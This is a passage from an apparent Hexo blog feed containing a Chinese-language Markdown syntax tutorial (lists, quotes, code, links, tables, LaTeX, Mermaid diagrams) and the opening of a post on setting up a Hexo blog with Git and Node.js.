HTML。</p></blockquote><p>而对于注脚，感觉使用数字作为类似文言文的课下注释更好。</p><h2 id="Markdown列表"><a href="#Markdown列表" class="headerlink" title="Markdown列表"></a>Markdown列表</h2><p>分为有序列表和无序列表。</p><p>无序列表以 * 、 + 、 - 作为标记，标记后加一个空格即可形成相应列表，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">*</span> 第一项</span><br><span class="line"><span class="bullet">*</span> 第二项</span><br><span class="line"><span class="bullet">*</span> 第三项</span><br><span class="line"></span><br><span class="line"><span class="bullet">+</span> 第一项</span><br><span class="line"><span class="bullet">+</span> 第二项</span><br><span class="line"><span class="bullet">+</span> 第三项</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="bullet">-</span> 第一项</span><br><span class="line"><span class="bullet">-</span> 第二项</span><br><span class="line"><span class="bullet">-</span> 第三项</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ul><li>第一项</li><li>第二项</li><li>第三项</li></ul><ul><li>第一项</li><li>第二项</li><li>第三项</li></ul><ul><li><p>第一项</p></li><li><p>第二项</p></li><li><p>第三项</p></li></ul><p>有序列表则使用数字加 <code>.</code> 来表示，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项</span><br><span class="line"><span class="bullet">2.</span> 第二项</span><br><span class="line"><span class="bullet">3.</span> 第三项</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ol><li>第一项</li><li>第二项</li><li>第三项</li></ol><p>列表可以进行嵌套，只需要在子列表选项前加四个空格即可，如下所示：</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 第一项：</span><br><span class="line"><span class="bullet">    -</span> 第一项嵌套的第一个元素</span><br><span class="line"><span class="bullet">    -</span> 第一项嵌套的第二个元素</span><br><span class="line"><span class="bullet">2.</span> 第二项：</span><br><span class="line"><span class="bullet">    -</span> 第二项嵌套的第一个元素</span><br><span class="line"><span class="bullet">    -</span> 第二项嵌套的第二个元素</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ol><li><p>第一项：</p><ul><li>第一项嵌套的第一个元素</li><li>第一项嵌套的第二个元素</li></ul></li><li><p>第二项：</p><ul><li><p>第二项嵌套的第一个元素</p></li><li><p>第二项嵌套的第二个元素</p></li></ul></li></ol><p>CSDN上面还介绍了待完成项目的列表，如下所示：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">- </span>[ ] 计划任务</span><br><span class="line"><span class="bullet">- </span>[x] 完成任务</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><ul><li><p>[ ] 计划任务</p></li><li><p>[x] 完成任务</p></li></ul><h2 id="Markdown区块"><a href="#Markdown区块" class="headerlink" title="Markdown区块"></a>Markdown区块</h2><p>这一部分主要介绍引用的使用。</p><p>Markdown区块引用是在段落开头使用 <code>&gt;</code> 符号，然后后面紧跟一个空格符号，如下所示：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">区块引用</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">菜鸟教程</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">学的不仅是技术更是梦想</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><blockquote><p>区块引用<br>菜鸟教程<br>学的不仅是技术更是梦想</p></blockquote><p>使用多个 <code>&gt;</code> 符号可以实现引用嵌套，如下所示：</p><figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">最外层</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">&gt; 第一层嵌套</span></span><br><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">&gt; &gt; 第二层嵌套</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><blockquote><p>最外层</p><blockquote><p>第一层嵌套</p><blockquote><p>第二层嵌套</p></blockquote></blockquote></blockquote><p>当然引用中也可以进行列表标注，列表中也可以使用引用作为内容</p><h2 id="Markdown代码"><a href="#Markdown代码" class="headerlink" title="Markdown代码"></a>Markdown代码</h2><p>对于段落上一个函数或者片段的代码，可以使用反引号将其包起来，即使用字体阴影，如下所示：</p><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`printf()` 函数</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><code>printf()</code> 函数</p><p>对于代码区块，可以使用4个反引号包裹，可以选择指定一种语言或者不指定，如下所示：</p><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">```<span class="language-javascript">javascript</span></span><br><span class="line"><span class="language-javascript">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="title function_">alert</span>(<span class="string">&#x27;RUNOOB&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span>```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$(<span class="variable language_">document</span>).<span class="title function_">ready</span>(<span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">alert</span>(<span class="string">&#x27;RUNOOB&#x27;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h2 id="Markdown链接"><a href="#Markdown链接" class="headerlink" title="Markdown链接"></a>Markdown链接</h2><p>使用链接，可以设定链接名称，也可以直接指定链接地址，如下所示：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">这是一个链接 <span class="selector-attr">[菜鸟教程]</span>(<span class="attribute">https</span>:<span class="comment">//www.runoob.com)</span></span><br><span class="line">&lt;<span class="attribute">https</span>:<span class="comment">//www.runoob.com&gt;</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>这是一个链接 <a href="https://www.runoob.com">菜鸟教程</a><br><a href="https://www.runoob.com">https://www.runoob.com</a></p><p>对于更高级的链接，可以通过使用变量来设置链接，然后在文档的结尾为变量赋值（网址）,有点像脚注，如下所示：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">这个链接用 <span class="number">1</span> 作为网址变量 <span class="selector-attr">[Google]</span><span class="selector-attr">[1]</span></span><br><span class="line">这个链接用 <span class="selector-tag">runoob</span> 作为网址变量 <span class="selector-attr">[Runoob]</span><span class="selector-attr">[runoob]</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="selector-attr">[1]</span>: <span class="selector-tag">http</span>:<span class="comment">//www.google.com/</span></span><br><span class="line"><span class="selector-attr">[runoob]</span>: <span class="selector-tag">http</span>:<span class="comment">//www.runoob.com/</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>这个链接用 1 作为网址变量 <a href="http://www.google.com/">Google</a><br>这个链接用 runoob 作为网址变量 <a href="http://www.runoob.com/">Runoob</a></p><h2 id="Markdown图片"><a href="#Markdown图片" class="headerlink" title="Markdown图片"></a>Markdown图片</h2><p>插入图片格式如下所示：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址)</span><br><span class="line">!<span class="selector-attr">[alt 属性文本]</span>(图片地址 &quot;可选标题&quot;)</span><br></pre></td></tr></table></figure><ul><li>首先开头一个<code>!</code></li><li>接下来使用方括号，里面放上图片的替代文字</li><li>接下来是一个圆括号，里面放上图片的地址，最后还可以用引号加上选择性的’title’属性文字，在鼠标移动到时候会显示相应的title属性</li></ul><p>使用实例如下所示：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">![RUNOOB 图标](http:<span class="regexp">//</span>static.runoob.com<span class="regexp">/images/</span>runoob-logo.png)</span><br><span class="line"></span><br><span class="line">![RUNOOB 图标](http:<span class="regexp">//</span>static.runoob.com<span class="regexp">/images/</span>runoob-logo.png <span class="string">&quot;RUNOOB&quot;</span>)</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="https://img-blog.csdnimg.cn/img_convert/703ed36e9477c82e2ef3e5869112b501.png" alt="image-20210906163150303"></p><p>对于图片格式，目前Markdown还不能指定图片的大小，如果需要相应功能，可以使用<img>标签，如下所示：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img <span class="attribute">src</span>=<span class="string">&quot;http://static.runoob.com/images/runoob-logo.png&quot;</span> <span class="attribute">width</span>=<span class="string">&quot;50%&quot;</span>&gt;</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p><img src="http://static.runoob.com/images/runoob-logo.png" width="50%"></p><h2 id="Markdown表格"><a href="#Markdown表格" class="headerlink" title="Markdown表格"></a>Markdown表格</h2><p>Markdown制作表格使用 <code>|</code>来分隔不同的单元格，使用 <code>-</code>来分隔表头和其他行</p><p>语法格式如下：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string">  表头   </span>|<span class="string"> 表头  </span>|</span><br><span class="line">|<span class="string">  ----  </span>|<span class="string"> ----  </span>|</span><br><span class="line">|<span class="string"> 单元格  </span>|<span class="string"> 单元格 </span>|</span><br><span class="line">|<span class="string"> 单元格  </span>|<span class="string"> 单元格 </span>|</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><div class="table-container"><table><thead><tr><th>表头</th><th>表头</th></tr></thead><tbody><tr><td>单元格</td><td>单元格</td></tr><tr><td>单元格</td><td>单元格</td></tr></tbody></table></div><p>对于表格也可以设置表格的对齐方式，设置在分隔符区域，主要有以下三种：</p><ul><li><code>-:</code> 设置内容和标题栏居右对齐</li><li><code>:-</code>设置内容和标题栏居左对齐</li><li><code>:-:</code>设置内容和标题栏居中对齐</li></ul><p>实例如下所示：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">|<span class="string"> 左对齐 </span>|<span class="string"> 右对齐 </span>|<span class="string"> 居中对齐 </span>|</span><br><span class="line">|<span class="string"> :-----</span>|<span class="string"> ----: </span>|<span class="string"> :----: </span>|</span><br><span class="line">|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|</span><br><span class="line">|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|<span class="string"> 单元格 </span>|</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><div class="table-container"><table><thead><tr><th style="text-align:left">左对齐</th><th style="text-align:right">右对齐</th><th style="text-align:center">居中对齐</th></tr></thead><tbody><tr><td style="text-align:left">单元格</td><td style="text-align:right">单元格</td><td style="text-align:center">单元格</td></tr><tr><td style="text-align:left">单元格</td><td style="text-align:right">单元格</td><td style="text-align:center">单元格</td></tr></tbody></table></div><p>个人感觉居中对齐会用的比较多，这里再次强调居中对齐为<code>:-:</code></p><h2 id="Markdown的高级用法"><a href="#Markdown的高级用法" class="headerlink" title="Markdown的高级用法"></a>Markdown的高级用法</h2><p>这里展示Markdown的一些其他用法，可能不会太常用，仅仅用于记录，以后在遇到更多的用法时候也会进行更新。</p><h4 id="支持HTML元素"><a href="#支持HTML元素" class="headerlink" title="支持HTML元素"></a>支持HTML元素</h4><p>个人没有学习过HTML，所以这里仅仅列出教程中提出的相关用法，作为参考</p><p>目前支持的 HTML 元素有：<code>&lt;kbd&gt; &lt;b&gt; &lt;i&gt; &lt;em&gt; &lt;sup&gt; &lt;sub&gt; &lt;br&gt;</code>等 ，如下使用<code>&lt;kdd&gt;</code>元素作为按钮元素样式：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 &lt;<span class="selector-tag">kbd</span>&gt;Ctrl&lt;/<span class="selector-tag">kbd</span>&gt;+&lt;<span class="selector-tag">kbd</span>&gt;Alt&lt;/<span class="selector-tag">kbd</span>&gt;+&lt;<span class="selector-tag">kbd</span>&gt;<span class="selector-tag">Del</span>&lt;/<span class="selector-tag">kbd</span>&gt; 重启电脑</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>使用 <kbd>Ctrl</kbd>+<kbd>Alt</kbd>+<kbd>Del</kbd> 重启电脑</p><p>在查询了相关HTML标签之后列出标签的意义：</p><p><code>&lt;kdd&gt;</code>：按钮</p><p><code>&lt;b&gt;</code>：加粗文本</p><p><code>&lt;i&gt;</code>：斜体文本</p><p><code>&lt;em&gt;</code>：查询为强调，似乎还是斜体</p><p><code>&lt;sup&gt;</code>：上标文本，当然个人感觉使用字体中提到的更加方便，天知道当时课程让读论文时候用标签写上下标是一种怎样的折磨（</p><p><code>&lt;sub&gt;</code>：下标文本，当然个人感觉使用字体中提到的更加方便</p><p><code>&lt;br&gt;</code>：换行</p><p><img>：图片标签，在前面指定图片大小时候用到</p><blockquote><p>关于标签内容可以参考<a href="https://www.w3school.com.cn/tags/tag_html.asp">该网页</a></p></blockquote><h4 id="转义"><a href="#转义" class="headerlink" title="转义"></a>转义</h4><p>虽然放在高级用法，但是感觉没啥好说的，很多地方已经用到了转义符<code>\</code>，否则没有办法打这些具有特殊意义的符号，在以下符号前需要加转义符号：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">\   反斜线</span><br><span class="line">`   反引号</span><br><span class="line"><span class="bullet">*   </span>星号</span><br><span class="line">_   下划线</span><br><span class="line">&#123;&#125;  花括号</span><br><span class="line">[]  方括号</span><br><span class="line">()  小括号</span><br><span class="line">#   井字号</span><br><span class="line">+   加号</span><br><span class="line"><span class="bullet">-   </span>减号</span><br><span class="line"><span class="bullet">.   </span>英文句点</span><br><span class="line">!   感叹号</span><br></pre></td></tr></table></figure><h4 id="公式"><a href="#公式" class="headerlink" title="公式"></a>公式</h4><p>包括这一部分的后面几个部分，与其说是Markdown倒不如说是相应的模块的语言，例如公式领域的LaTeX。</p><p>在使用LaTeX时候，使用两个$$$$符号包裹相应公式，以下面的公式举例：</p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$$</span><br><span class="line"><span class="string">\mathbf&#123;V&#125;_1</span> <span class="string">\times</span> <span class="string">\mathbf&#123;V&#125;_2</span> =  <span class="string">\begin&#123;vmatrix&#125;</span> </span><br><span class="line"><span class="string">\mathbf&#123;i&#125;</span> &amp; <span class="string">\mathbf&#123;j&#125;</span> &amp; <span class="string">\mathbf&#123;k&#125;</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\frac&#123;\partial</span> X&#125;&#123;<span class="string">\partial</span> u&#125; &amp;  <span class="string">\frac&#123;\partial</span> Y&#125;&#123;<span class="string">\partial</span> u&#125; &amp; <span class="number">0</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\frac&#123;\partial</span> X&#125;&#123;<span class="string">\partial</span> v&#125; &amp;  <span class="string">\frac&#123;\partial</span> Y&#125;&#123;<span class="string">\partial</span> v&#125; &amp; <span class="number">0</span> <span class="string">\\</span></span><br><span class="line"><span class="string">\end&#123;vmatrix&#125;</span></span><br><span class="line">$&#123;$tep1&#125;&#123;<span class="string">\style&#123;visibility:hidden&#125;&#123;(x+1)(x+1)&#125;&#125;</span></span><br><span class="line">$$</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><script type="math/tex; mode=display">\mathbf{V}_1 \times \mathbf{V}_2 =  \begin{vmatrix} \mathbf{i} & \mathbf{j} & \mathbf{k} \\\frac{\partial X}{\partial u} &  \frac{\partial Y}{\partial u} & 0 \\\frac{\partial X}{\partial v} &  \frac{\partial Y}{\partial v} & 0 \\\end{vmatrix}${$tep1}{\style{visibility:hidden}{(x+1)(x+1)}}</script><p>在CSDN的编辑页面给出的示例中，简单公式可以使用的是单个<code>$</code>进行包裹，下面为CSDN中的示例：</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Gamma</span>公式展示 <span class="symbol">$</span>\<span class="built_in">Gamma</span>(n) = (n<span class="number">-1</span>)!\quad\forall</span><br><span class="line">n\in\mathbb N<span class="symbol">$</span> 是通过欧拉积分</span><br><span class="line"></span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br><span class="line">\<span class="built_in">Gamma</span>(z) = \int_0^\infty t^&#123;z<span class="number">-1</span>&#125;e^&#123;-t&#125;dt\,.</span><br><span class="line"><span class="symbol">$</span><span class="symbol">$</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><p>Gamma公式展示 $\Gamma(n) = (n-1)!\quad\forall<br>n\in\mathbb N$ 是通过欧拉积分</p><script type="math/tex; mode=display">\Gamma(z) = \int_0^\infty t^{z-1}e^{-t}dt\,.</script><p>以上仅仅给出例子，但是并不能理解，看来以后还得留出时间搞搞LaTeX</p><blockquote><p><a href="http://meta.math.stackexchange.com/questions/5020/mathjax-basic-tutorial-and-quick-reference">更多的关于 <strong>LaTeX</strong> 数学表达式的信息</a></p></blockquote><h4 id="Mermaid"><a href="#Mermaid" class="headerlink" title="Mermaid"></a>Mermaid</h4><p>本来是要按照菜鸟教程中的结构进行学习的，但是学到后面发现其实都是基于Mermaid进行这几个图的绘制，所以干脆就直接将Mermaid作为标题了</p><p>yysy，Mermaid好像是个宝藏，有很多很有意思的地方，对于绘制流程图什么的也很有用，虽然在后面也有提及其官方网站链接，这里就先直接给出吧，作为下一个想要进行学习总结的小点。</p><p><a href="https://mermaidjs.github.io/">链接在此</a></p><p>链接中详细介绍了关于Mermaid的使用方法，而对于这篇Markdown总结来说，下面仅仅给出相关的示例。</p><h5 id="甘特图"><a href="#甘特图" class="headerlink" title="甘特图"></a>甘特图</h5><blockquote><p>甘特图（Gantt chart）又称为横道图、条状图(Bar chart)，其通过条状图来显示项目、进度和其他时间相关的系统进展的内在关系随着时间进展的情况，以提出者亨利·劳伦斯·甘特（Henry Laurence Gantt）先生的名字命名。</p></blockquote><p>以下给出一个甘特图实例：</p><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">```mermaid</span><br><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line">        title Adding GANTT diagram functionality to mermaid</span><br><span class="line">        section 现有任务</span><br><span class="line">        已完成               :done,    des1, 2014<span class="string">-01</span><span class="string">-06</span>,2014<span class="string">-01</span><span class="string">-08</span></span><br><span class="line">        进行中               :active,  des2, 2014<span class="string">-01</span><span class="string">-09</span>, 3d</span><br><span class="line">        计划一               :         des3, after des2, 5d</span><br><span class="line">        计划二               :         des4, after des3, 5d</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">gantt</span><br><span class="line">        dateFormat  YYYY-MM-DD</span><br><span class="line">        title Adding GANTT diagram functionality to mermaid</span><br><span class="line">        section 现有任务</span><br><span class="line">        已完成               :done,    des1, 2014-01-06,2014-01-08</span><br><span class="line">        进行中               :active,  des2, 2014-01-09, 3d</span><br><span class="line">        计划一               :         des3, after des2, 5d</span><br><span class="line">        计划二               :         des4, after des3, 5d</span><br></pre></td></tr></table></figure><p>yysy，甘特图还挺有意思的，看起来也不是那么复杂，以后可以尝试套用该模板进行编辑。</p><h5 id="UML图表"><a href="#UML图表" class="headerlink" title="UML图表"></a>UML图表</h5><p>下面将生成一个序列图：</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">```mermaid</span></span><br><span class="line"><span class="attribute">sequenceDiagram</span></span><br><span class="line"><span class="attribute">张三 -&gt;&gt; 李四</span><span class="punctuation">:</span> <span class="string">你好！李四, 最近怎么样?</span></span><br><span class="line"><span class="attribute">李四--&gt;&gt;王五</span><span class="punctuation">:</span> <span class="string">你最近怎么样，王五？</span></span><br><span class="line"><span class="attribute">李四--x 张三</span><span class="punctuation">:</span> <span class="string">我很好，谢谢!</span></span><br><span class="line"><span class="attribute">李四-x 王五</span><span class="punctuation">:</span> <span class="string">我很好，谢谢!</span></span><br><span class="line"><span class="attribute">Note right of 王五</span><span class="punctuation">:</span> <span class="string">李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">李四--&gt;&gt;张三</span><span class="punctuation">:</span> <span class="string">打量着王五...</span></span><br><span class="line"><span class="attribute">张三-&gt;&gt;王五</span><span class="punctuation">:</span> <span class="string">很好... 王五, 你怎么样?</span></span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">sequenceDiagram</span><br><span class="line">张三 -&gt;&gt; 李四: 你好！李四, 最近怎么样?</span><br><span class="line">李四--&gt;&gt;王五: 你最近怎么样，王五？</span><br><span class="line">李四--x 张三: 我很好，谢谢!</span><br><span class="line">李四-x 王五: 我很好，谢谢!</span><br><span class="line">Note right of 王五: 李四想了很长时间, 文字太长了&lt;br/&gt;不适合放在一行.</span><br><span class="line"></span><br><span class="line">李四--&gt;&gt;张三: 打量着王五...</span><br><span class="line">张三-&gt;&gt;王五: 很好... 王五, 你怎么样?</span><br></pre></td></tr></table></figure><p>下面则会生成一个流程图：</p><figure class="highlight brainfuck"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">```mermaid</span></span><br><span class="line"><span class="comment">graph LR</span></span><br><span class="line"><span class="comment">A</span><span class="title">[</span><span class="comment">长方形</span><span class="title">]</span> <span class="literal">--</span> <span class="comment">链接</span> <span class="literal">--</span>&gt; <span class="comment">B((圆))</span></span><br><span class="line"><span class="comment">A</span> <span class="literal">--</span>&gt; <span class="comment">C(圆角长方形)</span></span><br><span class="line"><span class="comment">B</span> <span class="literal">--</span>&gt; <span class="comment">D&#123;菱形&#125;</span></span><br><span class="line"><span class="comment">C</span> <span class="literal">--</span>&gt; <span class="comment">D</span></span><br><span class="line"><span class="comment">```</span></span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">graph LR</span><br><span class="line">A[长方形] -- 链接 --&gt; B((圆))</span><br><span class="line">A --&gt; C(圆角长方形)</span><br><span class="line">B --&gt; D&#123;菱形&#125;</span><br><span class="line">C --&gt; D</span><br></pre></td></tr></table></figure><h5 id="Flowchart流程图"><a href="#Flowchart流程图" class="headerlink" title="Flowchart流程图"></a>Flowchart流程图</h5><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">```mermaid</span><br><span class="line">flowchart TD</span><br><span class="line">    A[Start] --&gt; B&#123;Is it?&#125;;</span><br><span class="line">    B --&gt;|<span class="type">Yes</span>| <span class="type">C</span>[OK];</span><br><span class="line">    C --&gt; D[Rethink];</span><br><span class="line">    D --&gt; B;</span><br><span class="line">    B ----&gt;|<span class="type">No</span>| <span class="type">E</span>[<span class="keyword">End</span>];</span><br><span class="line">```</span><br></pre></td></tr></table></figure><p>显示效果如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">flowchart TD</span><br><span class="line">    A[Start] --&gt; B&#123;Is it?&#125;;</span><br><span class="line">    B --&gt;|Yes| C[OK];</span><br><span class="line">    C --&gt; D[Rethink];</span><br><span class="line">    D --&gt; B;</span><br><span class="line">    B ----&gt;|No| E[End];</span><br></pre></td></tr></table></figure><h2 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h2><h4 id="图片图床"><a href="#图片图床" class="headerlink" title="图片图床"></a>图片图床</h4><p>给出几个链接，可以将图片上传到图床上，这样Markdown中的图片路径可以使用网上路径代替本地路径</p><h4 id="更方便的做法"><a href="#更方便的做法" class="headerlink" title="更方便的做法"></a>更方便的做法</h4><p>更方便的做法是直接绑定一个云账户，使用Typora编辑时候直接自动将图片上传为网络路径。腾讯oss，阿里oss，七牛云都不错。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    
    <category term="Markdown" scheme="http://chalnl.com/tags/Markdown/"/>
    
  </entry>
  
  <entry>
    <title>Hexo博客搭建</title>
    <link href="http://chalnl.com/post/41646.html/"/>
    <id>http://chalnl.com/post/41646.html/</id>
    <published>2022-05-03T23:51:58.000Z</published>
    <updated>2022-08-16T13:12:32.406Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><blockquote><p>hexo简介：Hexo 是一个基于<a href="http://www.oschina.net/p/nodejs">nodejs</a> 的静态博客网站生成器。</p><p>基本要求：有手就行，看到我的你羡慕了没~</p></blockquote><h1 id="1-环境配置"><a href="#1-环境配置" class="headerlink" title="1.环境配置"></a>1.环境配置</h1><p>所需环境：</p><ul><li>[x] 1.nodejs14</li><li>[x] 2.git</li><li>[x] 3.Hexo cli</li><li>[x] 4.markdown编辑器</li></ul><h2 id="1-1-Git工具配置"><a href="#1-1-Git工具配置" class="headerlink" title="1.1.Git工具配置"></a>1.1.Git工具配置</h2><blockquote><p>Git 是一个开源的分布式版本控制系统，用于敏捷高效地处理任何或小或大的项目。</p><p>Git 是 Linus Torvalds 为了帮助管理 Linux 内核开发而开发的一个开放源码的版本控制软件。</p><p>Git 与常用的版本控制工具 CVS, Subversion 等不同，它采用了分布式版本库的方式，不必服务器端软件支持。</p></blockquote><p>windows：到git官网上下载,<a href="https://gitforwindows.org/">Download 